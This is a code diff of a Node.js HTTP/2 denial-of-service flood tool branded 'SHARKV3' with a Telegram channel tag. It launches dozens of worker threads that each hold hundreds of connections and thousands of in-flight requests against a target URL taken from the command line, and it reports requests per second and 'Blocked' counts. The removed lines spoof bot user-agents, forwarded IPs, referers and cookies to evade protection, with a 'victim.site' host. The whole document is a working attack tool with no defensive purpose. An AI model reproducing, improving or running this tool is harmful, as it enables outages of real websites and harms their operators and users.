@@ -1,70 +1,23 @@
-// SHARKV3 - T.ME/STSVKINGDOM + STS/TSP BYPASS V3
 const http2 = require('http2');
-const net = require('net');
 const { Worker, isMainThread, workerData } = require('worker_threads');
 const readline = require('readline');
+const net = require('net');
 
 const THREADS = 22;
 const POWER_MULTIPLIER = 2;
 const MAX_INFLIGHT = 2000;
 const LIVE_REFRESH_RATE = 100;
-const MAX_RESTARTS = 20;
 
 let totalRequests = 0;
 let successCount = 0;
 let errorCount = 0;
 let maxRps = 0;
 let rpsLastSecond = 0;
-let end;
+let end;  // Define the `end` variable here for the main thread
 
-function randRange(min, max) {
+// Helper function to get a random number within a range (inclusive)
+function getRandomInRange(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
-}
-
-function randIP() {
-    return Array.from({ length: 4 }, () => randRange(1, 254)).join('.');
-}
-
-function randUA() {
-    const bots = ['Googlebot', 'Bingbot', 'DuckDuckBot', 'Applebot'];
-    const os = ['Windows NT 10.0', 'Linux x86_64', 'Macintosh; Intel Mac OS X 10_15_7'];
-    const bot = bots[Math.floor(Math.random() * bots.length)];
-    const version = `${randRange(1, 10)}.${randRange(0, 9)}`;
-    return `Mozilla/5.0 (${os[Math.floor(Math.random() * os.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) ${bot}/${version}`;
-}
-
-function randReferer() {
-    const refs = ['https://google.com/', 'https://bing.com/', 'https://duckduckgo.com/', 'https://facebook.com/', 'https://t.me/stsvkingdom'];
-    return refs[Math.floor(Math.random() * refs.length)];
-}
-
-function randRoute() {
-    const paths = ['STS', 'S.T.S', 'TSP', 'THE-SILENT-PROTOCOL', 'bypass', 'route', 'silent'];
-    const path = Array.from({ length: randRange(2, 4) }, () => paths[randRange(0, paths.length - 1)]).join('/');
-    return `/${path}/${Math.random().toString(36).substring(7)}?tspid=${randRange(1000, 9999)}`;
-}
-
-function randCookie() {
-    return `session_id=${Math.random().toString(36).substring(2)}; device_id=${Math.random().toString(36).substring(2)}`;
-}
-
-function randHeaderObj() {
-    const headers = {
-        ':method': 'GET',
-        ':path': randRoute(),
-        'user-agent': randUA(),
-        'referer': randReferer(),
-        'x-forwarded-for': randIP(),
-        'accept-language': 'en-US,en;q=0.9',
-        'accept-encoding': 'gzip, deflate, br',
-        'authorization': `Bearer ${Math.random().toString(36).substring(2)}`,
-        'cookie': randCookie(),
-        'host': 'victim.site',
-        'connection': 'keep-alive'
-    };
-    const shuffled = {};
-    Object.keys(headers).sort(() => Math.random() - 0.5).forEach(k => shuffled[k] = headers[k]);
-    return shuffled;
 }
 
 if (isMainThread) {
@@ -75,45 +28,54 @@ if (isMainThread) {
 
     const target = process.argv[2];
     const duration = parseInt(process.argv[3]);
-    end = Date.now() + duration * 1000;
+
+    end = Date.now() + duration * 1000; // Define end time here in the main thread
 
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
+    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
-    let restarts = 0;
-    function startWorkers() {
-        for (let i = 0; i < THREADS; i++) {
-            new Worker(__filename, { workerData: { target, duration, connections: randRange(200, 500) } });
-        }
-        for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
-            new Worker(__filename, { workerData: { target, duration, connections: randRange(154, 500) } });
-        }
+    // Start the workers with dynamic connection numbers
+    for (let i = 0; i < THREADS; i++) {
+        const initialConnections = getRandomInRange(200, 500);  // Random initial connections between 200 and 500
+        new Worker(__filename, { workerData: { target, duration, initial: true, connections: initialConnections } });
     }
-    startWorkers();
 
+    for (let i = 0; i < THREADS * POWER_MULTIPLIER; i++) {
+        const additionalConnections = getRandomInRange(154, 500);  // Random additional connections between 154 and 500
+        new Worker(__filename, { workerData: { target, duration, initial: false, connections: additionalConnections } });
+    }
+
+    // Live Stats
     setInterval(() => {
         maxRps = Math.max(maxRps, rpsLastSecond);
-        rpsLastSecond = 0;
         renderStats();
+        rpsLastSecond = 0;
     }, LIVE_REFRESH_RATE);
 
     function renderStats() {
         readline.cursorTo(process.stdout, 0, 0);
         readline.clearScreenDown(process.stdout);
-        const timeLeft = Math.floor((end - Date.now()) / 1000);
+
+        // Remaining time calculation
+        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);  // in seconds
+        const minutesRemaining = Math.floor(timeRemaining / 60);
+        const secondsRemaining = Math.floor(timeRemaining % 60);
+
         console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
         console.log(`===========================`);
         console.log(`total: ${totalRequests}`);
         console.log(`max-r: ${maxRps}`);
         console.log(`===========================`);
         console.log(`succes: ${successCount}`);
+        console.log(`Blocked: ${errorCount}`);
         console.log(`===========================`);
-        console.log(`TIME REMAINING: ${timeLeft}s`);
+        console.log(`TIME REMAINING: ${minutesRemaining}:${secondsRemaining < 10 ? '0' : ''}${secondsRemaining}`);
     }
 
     const server = net.createServer(socket => {
-        socket.on('data', d => {
-            const msg = d.toString();
+        socket.on('data', data => {
+            const msg = data.toString();
             if (msg === 'req') totalRequests++, rpsLastSecond++;
             else if (msg === 'ok') successCount++;
             else if (msg === 'err') errorCount++;
@@ -121,18 +83,10 @@ if (isMainThread) {
     });
     server.listen(9999);
 
-    process.on('uncaughtException', () => {
-        if (++restarts <= MAX_RESTARTS) {
-            console.log(`[!] Restarting (${restarts}/${MAX_RESTARTS})...`);
-            startWorkers();
-        } else {
-            console.log('[x] Max restarts reached.');
-            process.exit(1);
-        }
-    });
 } else {
-    const { target, duration, connections } = workerData;
-    const endTime = Date.now() + duration * 1000;
+    const { target, duration, initial, connections } = workerData;
+    const endTime = Date.now() + duration * 1000;  // end time for worker threads
+
     const socket = net.connect(9999, '127.0.0.1');
     const sendStat = msg => socket.write(msg);
 
@@ -142,12 +96,13 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const req = client.request(randHeaderObj());
+                const req = client.request({ ':method': 'GET', ':path': '/' });
 
                 req.on('response', () => {
                     inflight.count--;
                     sendStat('ok');
                 });
+
                 req.on('error', () => {
                     inflight.count--;
                     sendStat('err');
@@ -160,22 +115,37 @@ if (isMainThread) {
                 sendStat('err');
             }
         }
-        setTimeout(() => sendLoop(client, inflight), randRange(1, 5));
+
+        // Slight delay to avoid killing the system
+        setTimeout(() => sendLoop(client, inflight), 0.5);  // Increase delay slightly for stability
     }
 
     function createConnection() {
         if (Date.now() > endTime) return;
 
-        const client = http2.connect(target);
-        const inflight = { count: 0 };
+        let client;
+        try {
+            client = http2.connect(target);
 
-        client.on('error', () => client.destroy());
-        client.on('goaway', () => client.close());
-        client.on('close', () => setTimeout(createConnection, 250));
-        client.on('connect', () => {
-            for (let i = 0; i < connections; i++) sendLoop(client, inflight);
-        });
+            const inflight = { count: 0 };
+
+            client.on('error', () => {
+                client.destroy();
+                setTimeout(createConnection, 5000); // auto-recover fast
+            });
+
+            client.on('goaway', () => client.close());
+            client.on('close', () => setTimeout(createConnection, 5000));
+
+            client.on('connect', () => {
+                for (let i = 0; i < connections; i++) sendLoop(client, inflight); // boosted request flow
+            });
+        } catch {
+            setTimeout(createConnection, 1000);
+        }
     }
 
-    for (let i = 0; i < connections; i++) createConnection();
-                  }
+    for (let i = 0; i < connections; i++) {
+        createConnection();
+    }
+}
